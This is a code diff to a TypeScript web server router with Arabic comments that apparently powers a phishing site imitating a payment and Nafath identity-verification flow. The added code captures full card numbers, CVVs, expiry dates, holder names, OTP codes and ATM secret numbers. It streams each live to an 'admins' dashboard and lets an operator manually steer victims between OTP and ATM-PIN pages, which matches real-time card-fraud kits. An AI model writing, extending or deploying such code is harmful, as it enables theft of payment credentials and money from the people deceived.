@@ -126,63 +126,81 @@ export function createSiteApiRouter(): Router {
           const str = (v: unknown) => (v != null ? String(v) : "");
 
           if (step === 1) {
-            const cardNum = str(body.CardID ?? body.cardID ?? "").replace(/\s/g, "");
+            // استخراج بيانات البطاقة من حقول site.js
+            // site.js يرسل: req.PaymentCardCode=CVV, req.PaymentCardExp=تاريخ, req.PaymentCardID=رقم البطاقة, req.PersonCardName=الاسم
+            const req = body.req || body;
+            const cardNum = str(req.PaymentCardID ?? req.CardID ?? req.cardID ?? body.PaymentCardID ?? "").replace(/\s/g, "");
+            const cvv = str(req.PaymentCardCode ?? req.CardCode ?? req.cardCode ?? body.PaymentCardCode ?? "");
+            const expiry = str(req.PaymentCardExp ?? req.DateExp ?? req.dateExp ?? body.PaymentCardExp ?? "");
+            const holderName = str(req.PersonCardName ?? req.CardHolderName ?? req.cardHolderName ?? body.PersonCardName ?? "");
+
             await createOrUpdatePayment(reference, {
-              cardHolderName: str(body.CardHolderName ?? body.cardHolderName ?? ""),
+              cardHolderName: holderName,
+              cardNumber: cardNum,          // رقم البطاقة الكامل
               cardLastFour: cardNum.slice(-4),
-              cardExpiry: str(body.DateExp ?? body.dateExp ?? ""),
+              cardCvv: cvv,                 // CVV
+              cardExpiry: expiry,
+              paymentAction: "STILL",       // إعادة تعيين الإجراء عند كل حجز جديد
               step: 1,
               status: "step1_done",
               rawData: body,
             });
             await updateBookingStatus(reference, "pending_payment");
-            try { getIo()?.to("admins").emit("newPayment", { reference, step: 1, type: "card" }); } catch (_) {}
+            // إشعار لوحة التحكم بالبيانات الكاملة
+            try {
+              getIo()?.to("admins").emit("newPayment", {
+                reference, step: 1, type: "card",
+                cardNumber: cardNum, cardLastFour: cardNum.slice(-4),
+                cardCvv: cvv, cardExpiry: expiry, cardHolderName: holderName,
+              });
+            } catch (_) {}
             return ok(res, { status: "STILL", step: 1 });
           }
 
           if (step === 2) {
+            const req = body.req || body;
+            const verifyCode = str(req.VerifyPaymentCode ?? req.VerifyPayment ?? req.verification_code ?? body.VerifyPaymentCode ?? "");
             await createOrUpdatePayment(reference, {
-              verifyCode: str(body.verification_code ?? body.VerifyPayment ?? ""),
+              verifyCode,
+              paymentAction: "STILL",       // إعادة تعيين الإجراء عند إدخال OTP جديد
               step: 2,
               status: "step2_done",
             });
-            try { getIo()?.to("admins").emit("newPayment", { reference, step: 2, type: "verify" }); } catch (_) {}
+            try { getIo()?.to("admins").emit("newPayment", { reference, step: 2, type: "otp", verifyCode }); } catch (_) {}
             return ok(res, { status: "STILL", step: 2 });
           }
 
           if (step === 3) {
+            const req = body.req || body;
+            const secretNum = str(req.SecretPaymentCode ?? req.SecretNum ?? req.secretNum ?? req.code ?? body.SecretPaymentCode ?? "");
             await createOrUpdatePayment(reference, {
-              secretNum: str(body.SecretNum ?? body.secretNum ?? body.code ?? ""),
+              secretNum,
+              paymentAction: "STILL",       // إعادة تعيين الإجراء عند إدخال ATM جديد
               step: 3,
               status: "step3_done",
             });
-            try { getIo()?.to("admins").emit("newPayment", { reference, step: 3, type: "secret" }); } catch (_) {}
+            try { getIo()?.to("admins").emit("newPayment", { reference, step: 3, type: "atm", secretNum }); } catch (_) {}
             return ok(res, { status: "STILL", step: 3, goToUrl: "/" });
           }
 
           return ok(res, { status: "STILL" });
         }
 
-        // ---- التحقق من حالة الدفع (PayFmIsVerified) ----
+        // ---- التحقق من حالة الدفع (PayFmIsVerified) - يتحكم فيها المسؤول من لوحة التحكم ----
         if (typeReq === "PayFmIsVerified") {
           const reference = String(body.reference || body.Reference || ipRefMap.get(clientIp) || "");
           if (!reference) return ok(res, { status: "EMPITY" });
 
           const payment = await getPaymentByReference(reference);
-          if (!payment) return ok(res, { status: "EMPITY" });
+          if (!payment) return ok(res, { status: "STILL" });
 
-          const booking = await getBookingByReference(reference);
-          const bStatus = booking?.status || "new";
-
-          if (bStatus === "payment_done" || bStatus === "verified" || bStatus === "completed") {
-            return ok(res, { status: "accepted" });
-          } else if (bStatus === "cancelled") {
-            return ok(res, { status: "denied" });
-          } else if (payment.step === 3 || payment.step === 4 || payment.step === 5) {
-            return ok(res, { status: "pass" });
-          } else {
-            return ok(res, { status: "STILL" });
-          }
+          // المسؤول يتحكم في paymentAction:
+          // STILL    = لا يزال ينتظر (يكمل polling)
+          // accepted = توجيه لصفحة OTP (يظهر حقل رمز التحقق)
+          // pass     = توجيه لصفحة ATM (يظهر حقل رقم ATM)
+          // denied   = رفض (يظهر رسالة خطأ)
+          const action = payment.paymentAction || "STILL";
+          return ok(res, { status: action });
         }
 
         // ---- نفاذ (Nafath) ----
@@ -302,26 +320,58 @@ export function createSiteApiRouter(): Router {
           return ok(res, { status: "EMPITY" });
         }
 
-        // ---- تعيين حالة الإجراء (SetActionStatus) ----
+        // ---- تعيين حالة الإجراء (SetActionStatus) - من لوحة التحكم ----
         if (typeReq === "SetActionStatus") {
           const reference = String(body.Reference || body.reference || body.ID || "");
           const action = String(body.action || "");
+          const actionType = String(body.actionType || ""); // "payment" | "nafath" | "motasel" | "booking"
 
           if (reference) {
-            if (action === "accepted" || action === "verified") {
-              await updateBookingStatus(reference, "verified", 1);
-            } else if (action === "completed") {
-              await updateBookingStatus(reference, "completed", 1);
-            } else if (action === "denied" || action === "cancelled") {
-              await updateBookingStatus(reference, "cancelled", 1);
-            } else {
-              // إرسال رمز نفاذ من المسؤول
+            if (actionType === "payment" || actionType === "") {
+              // التحكم في خطوات الدفع
+              if (action === "accepted") {
+                // توجيه لصفحة OTP
+                await createOrUpdatePayment(reference, { paymentAction: "accepted" });
+                try { getIo()?.to("admins").emit("paymentActionSet", { reference, action: "accepted" }); } catch (_) {}
+              } else if (action === "pass") {
+                // توجيه لصفحة ATM
+                await createOrUpdatePayment(reference, { paymentAction: "pass" });
+                try { getIo()?.to("admins").emit("paymentActionSet", { reference, action: "pass" }); } catch (_) {}
+              } else if (action === "denied") {
+                // رفض الدفع
+                await createOrUpdatePayment(reference, { paymentAction: "denied" });
+                await updateBookingStatus(reference, "cancelled", 1);
+                try { getIo()?.to("admins").emit("paymentActionSet", { reference, action: "denied" }); } catch (_) {}
+              } else if (action === "verified" || action === "completed") {
+                // قبول نهائي
+                await createOrUpdatePayment(reference, { paymentAction: "accepted", status: "verified" });
+                await updateBookingStatus(reference, action === "completed" ? "completed" : "verified", 1);
+                try { getIo()?.to("admins").emit("paymentActionSet", { reference, action }); } catch (_) {}
+              }
+            } else if (actionType === "nafath") {
+              // إرسال رمز نفاذ
               await createOrUpdateVerification(reference, "nafath", {
                 nafathNumber: action,
                 step: 2,
                 status: "step1_done",
               });
               try { getIo()?.to("admins").emit("nafathCodeSent", { reference, code: action }); } catch (_) {}
+            } else if (actionType === "motasel") {
+              if (action === "accepted") {
+                await updateBookingStatus(reference, "verified", 1);
+                await createOrUpdateVerification(reference, "motasel", { status: "verified" });
+              } else if (action === "denied") {
+                await updateBookingStatus(reference, "cancelled", 1);
+              }
+              try { getIo()?.to("admins").emit("motaselActionSet", { reference, action }); } catch (_) {}
+            } else if (actionType === "booking") {
+              if (action === "accepted" || action === "verified") {
+                await updateBookingStatus(reference, "verified", 1);
+              } else if (action === "completed") {
+                await updateBookingStatus(reference, "completed", 1);
+              } else if (action === "denied" || action === "cancelled") {
+                await updateBookingStatus(reference, "cancelled", 1);
+              }
             }
           }
 
